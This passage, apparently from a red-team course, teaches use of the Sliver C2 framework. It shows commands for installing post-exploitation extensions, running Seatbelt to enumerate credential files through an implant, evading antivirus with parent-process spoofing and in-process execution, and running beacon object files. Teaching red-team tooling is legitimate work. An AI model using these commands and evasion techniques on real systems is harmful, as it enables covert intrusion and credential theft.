The Sliver armory is used to install and maintain third party extensions and aliases within sliver. The full list of available extensions can be found at https://github.com/sliverarmory/armory, keep in mind this is community maintained so not all modules are necessarily up to date. 

You can download all configured extensions/aliases using the armory command.

```bash
[server] sliver > armory install all
? Install 18 aliases and 84 extensions? Yes
[*] Installing alias 'SharpSecDump' (v0.0.1) ... done!
[*] Installing alias 'SharpChrome' (v0.0.1) ... done!
[*] Installing alias 'SharpDPAPI' (v0.0.1) ... done!
[*] Installing alias 'SharpMapExec' (v0.0.1) ... done!
[*] Installing alias 'KrbRelayUp' (v0.0.1) ... done!
[*] Installing alias 'SharpRDP' (v0.0.1) ... done!
[*] Installing alias 'SharpUp' (v0.0.1) ... done!
[*] Installing alias 'SharpView' (v0.0.1) ... done!
[*] Installing alias 'SharPersist' (v0.0.1) ... done!
[*] Installing alias 'Sharp WMI' (v0.0.2) ... done!
...
[*] All packages installed
```

These commands can then be used in the context of a session or beacon similarly to other commands, with a couple caveats.

Let’s go ahead and run our first assembly.

```bash
[server] sliver (UNABLE_PRIDE) > seatbelt " WindowsCredentialFiles"

[*] seatbelt output:

                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v1.1.1         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,

====== WindowsCredentialFiles ======

  Folder : C:\Users\defaultuser0\AppData\Local\Microsoft\Credentials\

   ...
```

As you can see Sliver ran the Seatbelt assembly and provided us with the output of our command. Let’s investigate how exactly that happened.

The first thing we can notice is a new process spinning up when we run our command.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ae07f231-691e-4933-883f-fa368d0f78e6/Untitled.png)

Taking a closer look, that process is a child of our implant `UNABLE_PRIDE.exe`.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2dfe565c-6429-4b74-a916-5a920f0ca85e/Untitled.png)

If you look at the assemblies loaded in that process, you’ll notice that the .NET clr along with the Seatbelt code are loaded into memory.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a92e524b-dda2-4b41-8254-3fc47e2ed025/Untitled.png)

All of this information indicates this process was used to run a post-exploitation module and will by default get caught by most AV’s. 

A more stealthy approach would be to change the default process to something more realistic and use parent process spoofing in order to mask our activity such as in the example below.

```bash
[server] sliver (UNABLE_PRIDE) > seatbelt -P 2968 -p "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" " WindowsCredentialFiles"
```

In this case we spoof our parent process id to `2968`, a Chrome process that has other similar child processes and set the default program to be `chrome.exe`.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/93ee0728-be82-4fbb-8084-47f2bd336ece/Untitled.png)

This already looks a lot better and is more likely to bypass detections. A further improvement could be to identify processes that already load the .net CLR and use those to host our post-exploitation payloads or doing additional obfuscation of our extensions to avoid static detections such as `Seatbelt`,However this is somewhat beyond the scope of this course.

Another way to avoid detection is by running the assembly in process using the `-i` flag, while that avoids spinning up a new process, if the extension crashes for whatever reason you will loose your implant.

```bash
[server] sliver (UNABLE_PRIDE) > seatbelt -i " WindowsCredentialFiles"
...
```

If we take a look at the process hosting seatbelt, we’ll see its our implant process which will contain the .NET assembly references.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/37729326-f18b-4250-a873-d4bf4e54b7d5/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e1c05c2f-f2b7-4784-a23b-a837f456cb45/Untitled.png)

## Bof’s

Beacon object files are loaded using trustedsec’s coffloader, when you run a bof command the loader will first be loaded into memory and is used to run whichever bof you choose. From an operator’s perspective bof’s are similar to basic sliver commands.

```bash
[server] sliver (UNABLE_PRIDE) > sa-whoami

[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:

UserName		SID
====================== ====================================
test.local\tester

GROUP INFORMATION                                 Type                     SID                                          Attributes
================================================= ===================== ============================================= ==================================================
test.local\None                              Group                    S-1-5-21-3109228153-3872411817-1195593578-513 Mandatory group, Enabled by default, Enabled group,
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account and member of Administrators groupWell-known group         S-1-5-114
BUILTIN\Administrators                            Alias                    S-1-5-32-544
BUILTIN\Performance Log Users                     Alias                    S-1-5-32-559                                  Mandatory group, Enabled by default, Enabled group,
BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group,
CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account                        Well-known group         S-1-5-113                                     Mandatory group, Enabled by default, Enabled group,
LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\NTLM Authentication                  Well-known group         S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group,
Mandatory Label\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group,

Privilege Name                Description                                       State
============================= ================================================= ===========================
SeShutdownPrivilege           Shut down the system                              Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled
SeUndockPrivilege             Remove computer from docking station              Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled
SeTimeZonePrivilege           Change the time zone                              Disabled
```

Since these payloads are run in-process, they have similar advantages and drawbacks as in-process assemblies meaning no new processes are spawned on execution, but a crash risks loosing the implant.
